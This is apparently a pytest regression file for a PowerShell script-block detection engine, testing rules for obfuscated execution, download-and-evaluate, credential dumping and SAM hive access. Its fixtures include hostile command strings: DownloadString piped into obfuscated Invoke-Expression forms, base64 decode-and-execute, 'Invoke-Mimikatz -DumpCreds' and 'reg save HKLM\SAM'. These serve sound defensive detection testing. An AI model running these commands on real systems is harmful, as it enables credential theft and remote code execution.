"""Native script regressions for bounded reading, call modes and block-local corrections."""
import json
import subprocess
import sys
import tempfile
import time
import uuid
from pathlib import Path

if __name__ == "__main__":
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import pytest

from romulus.detect.powershell_tokens import read_event_script
from romulus.evidence.windows import normalize_windows
from romulus.evidence.windows_catalog import POWERSHELL_CHANNEL, POWERSHELL_PROVIDER
from romulus.evidence.windows_reassembly import ScriptBlockAssembler
from tests.test_windows_script_rules import RULES
from tests.windows_fixtures import SHAPES, LogicalWindowsEvent, windows_hit


def native(text, *, block="block-a", number=1, total=1, record=1, shipper="winlogbeat_8"):
    logical = LogicalWindowsEvent(POWERSHELL_CHANNEL, POWERSHELL_PROVIDER, 4104, "ws01", record,
                                  "2026-01-01T00:00:00Z", {"ScriptBlockText": text,
                                  "ScriptBlockId": str(uuid.uuid5(uuid.NAMESPACE_URL, block)), "MessageNumber": str(number),
                                  "MessageTotal": str(total)})
    return normalize_windows(windows_hit(logical, shipper))


@pytest.mark.parametrize("shipper", SHAPES)
@pytest.mark.parametrize("target", ["&(gcm i*x)", "&($PSHome[4]+$PSHome[30]+'x')",
                                    "&($ShellId[1]+$ShellId[13]+'x')", ".(gcm i*x)",
                                    "& ($unknown+'x')", "& ('{0}' -f $unknown)", "& (-join $parts)"])
def test_constructed_unresolved_call_is_generic_download_and_decode_evaluator(shipper, target):
    source = "(New-Object Net.WebClient).DownloadString('https://example.test/a') | " + target
    observation = native(source, shipper=shipper)
    for name in ("download", "obfuscated_execution"):
        [match] = RULES[name]().consume([observation])
        assert match.proposed_lane == "lead"
    parsed = read_event_script(observation)
    assert parsed.evaluates_code and not parsed.commands & {"iex", "invoke-expression", "invoke-mimikatz"}
    decoded = native("[Convert]::FromBase64String($data) | " + target, shipper=shipper)
    assert RULES["decode_evaluation"]().consume([decoded])


@pytest.mark.parametrize("source", ["& $scriptBlock", "& $cmd @args", r". $PSScriptRoot\helper.ps1",
                                   '& "$env:ProgramFiles\\App\\app.exe"'])
def test_plain_dynamic_targets_do_not_claim_obfuscated_execution(source):
    assert not RULES["obfuscated_execution"]().consume([native(source)])


@pytest.mark.parametrize("prefix", ["$null = " + "(" * 34 + "1" + ")" * 34,
                                   "''+" * 700 + "x"])
def test_constant_limit_skips_current_statement_and_later_call_still_folds(prefix):
    observation = native(prefix + "\n& ('Invoke-Mimi'+'katz') -DumpCreds")
    assert RULES["offensive_function"]().consume([observation])
    assert RULES["obfuscated_execution"]().consume([observation])


@pytest.mark.parametrize("count", [257, 5000])
def test_fold_evidence_cap_does_not_make_complete_high_call_partial(count):
    observation = native("".join(f"$v{i}='x';" for i in range(count)) + "Invoke-Mimikatz -DumpCreds")
    parsed = read_event_script(observation)
    assert not parsed.partial
    assert len(parsed.constant_folds) == 256
    rule = RULES["offensive_function"]()
    [match] = rule.consume([observation])
    assert match.proposed_lane == "high"
    assert not rule.limits
    assert any("fold evidence list truncated at 256" in note.lower() for note in match.notes)


def test_sam_high_requires_export_verb_for_the_sensitive_hive():
    [match] = RULES["sam_access"]().consume([native(r"reg save HKLM\SYSTEM x; reg query HKLM\SAM")])
    assert match.proposed_lane == "lead"
    for verb in ("save", "export"):
        [match] = RULES["sam_access"]().consume([native(f"reg {verb} HKLM\\SAM x")])
        assert match.proposed_lane == "high"


def test_command_argument_mode_does_not_fold_unparenthesized_plus():
    observation = native("& 'Invoke-Mimi'+'katz' -DumpCreds")
    assert not RULES["offensive_function"]().consume([observation])
    assert "invoke-mimikatz" not in read_event_script(observation).commands
    assert not RULES["sam_access"]().consume([native(r"reg save 'hklm\' + 'sam' C:\x")])


@pytest.mark.parametrize("mutation", ["sv x 'Get-Date'", "Set-Variable x 'Get-Date'", "$x='Get-Date'"])
def test_same_statement_mutator_invalidates_prior_constant(mutation):
    observation = native("$x='Invoke-Mimikatz'\nWrite-Output (" + mutation + ") (& $x)")
    assert not RULES["offensive_function"]().consume([observation])


@pytest.mark.parametrize('mutator', [
    '& Set-Variable', '& sv', "& 'Set-Variable'", r'Microsoft.PowerShell.Utility\Set-Variable',
    r'& Microsoft.PowerShell.Utility\Set-Variable', r'. Microsoft.PowerShell.Utility\Set-Variable',
    r". 'Microsoft.PowerShell.Utility\Set-Variable'", "& ('Set-'+'Variable')", '. (gcm Set-Variable)',
])
def test_operator_and_module_qualified_mutators_invalidate_at_command_position(mutator):
    observation = native("$x='Invoke-Mimikatz'\nWrite-Output (" + mutator + " x 'Get-Date') (& $x)")
    assert not RULES['offensive_function']().consume([observation])
    assert 'invoke-mimikatz' not in read_event_script(observation).commands


@pytest.mark.parametrize('argument', ["'Set-Variable'", 'Set-Variable',
                                     r"'Microsoft.PowerShell.Utility\Set-Variable'"])
def test_mutator_names_as_data_do_not_invalidate_an_observed_constant_call(argument):
    observation = native("$x='Invoke-Mimikatz'\nWrite-Output " + argument + ' (& $x)')
    [match] = RULES['offensive_function']().consume([observation])
    assert match.proposed_lane == 'high'


def test_partial_coverage_names_the_exact_constant_and_lexical_limits():
    for prefix, expected in [("$null=" + "("*34 + "1" + ")"*34, 'MAX_DEPTH=32'),
                             ("1"*70_000, 'MAX_WORD_CHARS=65536')]:
        observation = native(prefix + "\nInvoke-Mimikatz")
        rule = RULES['offensive_function']()
        [match] = rule.consume([observation])
        assert match.proposed_lane == 'lead'
        assert expected in read_event_script(observation).limits
        assert any(expected in reason for reason in rule.limit_reasons())


def test_join_correction_cannot_rewrite_another_blocks_shared_fragment(tmp_path):
    rule, assembler = RULES["offensive_function"](), ScriptBlockAssembler(tmp_path)
    try:
        a = assembler.consume([native("Invoke-Mimikatz", block="a", total=2, record=1)])
        b = assembler.consume([native("Invoke-Mimikatz", block="b", total=2, record=2)])
        [first] = rule.consume(a)
        second = rule.consume(b)
        completed = assembler.consume([native("'", block="b", number=2, total=2, record=3)])
        # An unclosed quoted join remains partial; a separate complete inert view is required.
        assert not any(m.group_key == first.group_key and m.revision_reason for m in rule.consume(completed))
        # Two blocks can share an executable fragment that becomes an argument when joined.
        rule2 = RULES["offensive_function"]()
        fragments = [native("Invoke-Mimikatz", block=block, number=2, total=2, record=10+i)
                     for i, block in enumerate(("c", "d"))]
        [c] = rule2.consume([fragments[0]])
        [d] = rule2.consume([fragments[1]])
        joined = assembler.consume([native("Write-Output ", block="d", number=1, total=2, record=20),
                                    fragments[1]])
        corrected = rule2.consume(joined)
        assert any(m.group_key == d.group_key and m.revision_reason and 'argument' in m.claim for m in corrected)
        assert all(m.group_key != c.group_key for m in corrected)
        assert not second or second[0].group_key != first.group_key
    finally:
        assembler.close()


ADVERSARIAL = (
    "digits_amp", "digits_amp_many", "dollar_brace", "word_merge", "word_merge_dq",
    "empty_concat_exprs", "empty_concat_top", "var_concat_exprs", "nested_f", "char_join",
    "invoke_rep", "deep_paren", "deep_bracket", "many_vars", "alt_quotes", "here_strings",
    "here_unclosed", "backticks", "old_b1", "nested_expr_str", "block_comment_open",
    "member_chain_typed", "concat_chain_vars_top", "format_bomb", "format_failure", "old_variables",
)


def adversarial(name, n):
    pieces = {
        "digits_amp": "1" * (n-1) + "&", "digits_amp_many": ("1" * 1023 + "&"),
        "dollar_brace": "${", "word_merge": "x'b'c", "word_merge_dq": 'x"b"c',
        "empty_concat_exprs": '"$(' + "''+" * 430 + 'x)"\n',
        "empty_concat_top": "''+" * (n//3) + "x",
        "var_concat_exprs": '"$($a=\'\';' + "$a+" * 430 + 'x)"\n',
        "char_join": "-join[char[]](" + ",".join(["65"] * 200) + ")\n",
        "invoke_rep": "$x.a.Invoke(", "deep_paren": "(", "deep_bracket": "[",
        "alt_quotes": "'a'\"b\"‘c’“d”", "here_strings": '@"\n$(1)\n"@\n',
        "here_unclosed": '@"\n', "backticks": "i`e`x", "old_b1": "']'::b(),",
        "nested_expr_str": '"$(', "block_comment_open": "<#", "member_chain_typed": "[a]::b(",
        "concat_chain_vars_top": "$a='';" + "$a+" * (n//3) + "x",
        "format_bomb": "$a='" + "{0}" * 1000 + "';" + "$b=$a -f 'xxxxxxxxxxxxxxxx';" * (n//40),
        "format_failure": "$a='" + 'x'*4096 + "{bad}';" + "$b=$a -f 'x';" * (n//14),
        "old_variables": "$" * n,
    }
    if name == "many_vars":
        return "".join(f"$v{i}='a'+'b';" for i in range(n//12 + 1))[:n]
    if name == "nested_f":
        piece = "'x'"
        for _ in range(200):
            piece = "('{0}' -f " + piece + ")"
    else:
        piece = pieces[name]
    return (piece * max(1, (n + len(piece)-1)//len(piece)))[:n]


@pytest.mark.parametrize("name", ADVERSARIAL)
def test_native_adversarial_reader_has_hard_timeout_and_linear_scaling(name):
    completed = subprocess.run([sys.executable, str(Path(__file__).resolve()), "--probe", name],
                               capture_output=True, text=True, timeout=18, check=False)
    assert completed.returncode == 0, completed.stdout + completed.stderr
    timings = json.loads(completed.stdout)
    print(name, json.dumps(timings))
    assert timings[1]['seconds'] < 8
    assert timings[1]['seconds'] <= 20 * max(timings[0]['seconds'], .02), timings


if __name__ == "__main__" and "--probe" in sys.argv:
    timings = []
    for size in (65_536, 1_048_576):
        text = adversarial(sys.argv[-1], size)
        with tempfile.TemporaryDirectory() as directory:
            assembler = ScriptBlockAssembler(Path(directory))
            try:
                midpoint = len(text)//2
                views = assembler.consume([native(text[:midpoint], total=2),
                                           native(text[midpoint:], number=2, total=2, record=2)])
                [observation] = [view for view in views if view.get('script.view') == 'joined']
                assert observation.get('script.text') == text
            finally:
                assembler.close()
        started = time.perf_counter()
        parsed = read_event_script(observation)
        timings.append({'seconds': time.perf_counter() - started, 'partial': parsed.partial,
                        'limits': sorted(parsed.limits)})
        assert not parsed.partial or parsed.limits, "partial reading must name its exact bound or syntax limit"
    print(json.dumps(timings))
